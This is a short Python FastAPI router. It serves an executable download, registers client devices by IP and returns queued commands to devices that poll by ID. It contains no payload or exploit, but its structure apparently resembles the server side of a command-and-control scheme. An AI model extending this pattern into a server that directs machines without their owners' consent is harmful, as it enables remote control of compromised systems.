from fastapi import APIRouter, Request
from fastapi.responses import StreamingResponse
import os
from models.device import Device

mainRouter = APIRouter(prefix="/app")

# download the main file
@mainRouter.get("/download")
def download_large_file():
    file_path = "uploads/file.exe"
    
    def file_iterator():
        with open(file_path, mode="rb") as file:
            while chunk := file.read(8192):  # Читаем блоками по 8KB
                yield chunk 

    return StreamingResponse(
        file_iterator(),
        media_type="exe",
        headers={"Content-Disposition": "attachment; filename=file.exe"}
    )

# Contain list of registered devices
@mainRouter.get("/register")
def register(request: Request):
    devices = request.app.state.shared_config["devices"]

    ip = request.client.host
    count = sum(1 for d in devices if d.ip == ip)
    if count >= 10:
        return {"error": "Limit of 10 devices per IP reached"}

    max_id = 0
    for dev in devices:
        if dev._id > max_id:
            max_id = dev._id

    new_id = max_id + 1

    new_device = Device(new_id, ip)
    devices.append(new_device)

    request.app.state.shared_config["devices"] = devices

    return {"device_id": new_id}

@mainRouter.get("/command/{device_id}")
def getCommand(device_id:int, request: Request):
    devices = request.app.state.shared_config["devices"]

    current_device = None
    i = 0

    while not current_device and i < len(devices):
        if devices[i]._id == device_id:
            current_device = devices[i]
        i += 1

    if current_device:
        return current_device.get_command()
    else:
        return {"error": "device is not found"}